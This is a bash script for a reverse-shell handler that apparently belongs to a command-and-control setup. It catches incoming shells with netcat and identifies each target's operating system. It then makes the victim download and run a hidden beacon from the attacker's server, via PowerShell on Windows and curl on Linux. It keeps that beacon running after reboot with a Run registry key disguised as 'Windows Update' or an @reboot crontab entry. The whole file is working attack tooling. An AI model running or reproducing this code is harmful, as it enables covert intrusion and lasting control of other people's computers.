#!/bin/bash
# Persistent reverse shell handler that upgrades connections to beacons

# Configuration
LISTEN_PORT=4444
BEACON_PATH="/opt/c2/implants/jquery-windows.exe"
LINUX_BEACON_PATH="/opt/c2/implants/jquery-linux"
STAGING_DIR="/opt/c2/shells"

function handle_connection() {
    # Assign a unique ID to this connection
    CONN_ID=$(date +%s%N | md5sum | head -c 8)
    FIFO_IN="${STAGING_DIR}/${CONN_ID}.in"
    FIFO_OUT="${STAGING_DIR}/${CONN_ID}.out"
    
    # Create the named pipes
    mkfifo ${FIFO_IN}
    mkfifo ${FIFO_OUT}
    
    # Start the shell handler in the background
    cat ${FIFO_IN} | nc -l -p $1 > ${FIFO_OUT} &
    PID=$!
    
    echo "[+] Received connection, assigned ID: ${CONN_ID}"
    
    # Send initial commands to identify the target
    echo "whoami" > ${FIFO_IN}
    sleep 1
    echo "hostname" > ${FIFO_IN}
    sleep 1
    echo "uname -a || ver" > ${FIFO_IN}
    sleep 2
    
    # Read the responses to determine OS
    TARGET_INFO=$(cat ${FIFO_OUT} | tr -d '\0' | tr -d '\r')
    
    # Check if Windows or Linux
    if echo "${TARGET_INFO}" | grep -q "Microsoft Windows"; then
        echo "[+] Detected Windows system, deploying Windows beacon..."
        # Upload the Windows beacon
        echo "powershell.exe -Command \"[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('http://$(hostname -I | awk '{print $1}'):8080/win-beacon.exe', '${STAGING_DIR}/shell.exe')\"" > ${FIFO_IN}
        sleep 3
        echo "powershell.exe -Command \"Start-Process -FilePath '${STAGING_DIR}/shell.exe' -WindowStyle Hidden\"" > ${FIFO_IN}
        sleep 2
        # Attempt to establish persistence
        echo "powershell.exe -Command \"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Windows Update' -Value '${STAGING_DIR}/shell.exe' -PropertyType String -Force\"" > ${FIFO_IN}
    else
        echo "[+] Detected Linux/Unix system, deploying Linux beacon..."
        # Upload the Linux beacon
        echo "curl -s http://$(hostname -I | awk '{print $1}'):8080/linux-beacon -o /tmp/.service" > ${FIFO_IN}
        sleep 2
        echo "chmod +x /tmp/.service" > ${FIFO_IN}
        sleep 1
        echo "nohup /tmp/.service > /dev/null 2>&1 &" > ${FIFO_IN}
        sleep 1
        # Attempt to establish persistence
        echo "(crontab -l 2>/dev/null; echo '@reboot /tmp/.service') | crontab -" > ${FIFO_IN}
    fi
    
    echo "[+] Beacon deployment attempted. Leaving shell open for manual operation if needed."
    
    # Wait for the user to kill the handler
    wait $PID
    
    # Clean up
    rm -f ${FIFO_IN} ${FIFO_OUT}
}

# Create a simple HTTP server to serve beacons
/opt/c2/scripts/serve-beacons.sh > /dev/null 2>&1 &

# Main loop to keep listener persistent
while true; do
    handle_connection ${LISTEN_PORT}
    echo "[-] Connection closed, restarting listener..."
    sleep 1
done